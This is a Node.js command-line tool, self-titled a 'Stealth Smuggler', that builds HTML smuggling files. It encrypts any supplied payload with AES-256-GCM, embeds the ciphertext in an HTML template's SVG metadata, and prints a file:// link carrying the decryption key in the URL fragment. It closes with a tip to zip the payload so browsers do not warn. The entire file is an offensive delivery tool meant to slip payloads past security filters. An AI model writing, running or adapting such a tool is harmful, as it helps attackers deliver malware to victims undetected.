#!/usr/bin/env node
import fs from "fs";
import crypto from "crypto";
import chalk from "chalk";
import { program } from "commander";
import path from "path";

program
    .requiredOption('-f, --file <path>', 'Payload to smuggle')
    .option('-o, --out <path>', 'Output file', 'stealth_delivery.html')
    .parse(process.argv);

const opts = program.opts();

async function build() {
    console.log(chalk.magenta('\n--- Pro Evolution: Stealth Smuggler ---'));

    try {
        // 1. Prepare Encryption
        const fileBuffer = fs.readFileSync(opts.file);
        const key = crypto.randomBytes(32);
        const iv = crypto.randomBytes(12);
        const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);

        const encrypted = Buffer.concat([cipher.update(fileBuffer), cipher.final()]);
        const tag = cipher.getAuthTag();

        // 2. Load the Stealth Template
        // Ensure this file exists in ./templates/stealth.html
        let template = fs.readFileSync('./templates/stealth.html', 'utf8');

        // 3. Inject Encrypted Data into the SVG Metadata
        const finalHtml = template
            .replace('{{PAYLOAD}}', encrypted.toString('base64'))
            .replace('{{IV}}', iv.toString('base64'))
            .replace('{{TAG}}', tag.toString('base64'));

        // 4. Write to Disk (Note: use opts.out, not opts.output)
        fs.writeFileSync(opts.out, finalHtml);

        // 5. Output Success Details
        const keyHex = key.toString('hex');
        const absolutePath = path.resolve(opts.out);

        console.log(chalk.green(`[+] Stealth Payload Generated: ${opts.out}`));
        console.log(chalk.cyan(`[!] Targeted URL:`));
        console.log(chalk.white(`file://${absolutePath}#${keyHex}`));
        console.log(chalk.yellow('\n[!] Reminder: Use a .zip for the payload to avoid browser warnings.'));

    } catch (err) {
        console.log(chalk.red(`[-] Error: ${err.message}`));
    }
}

build();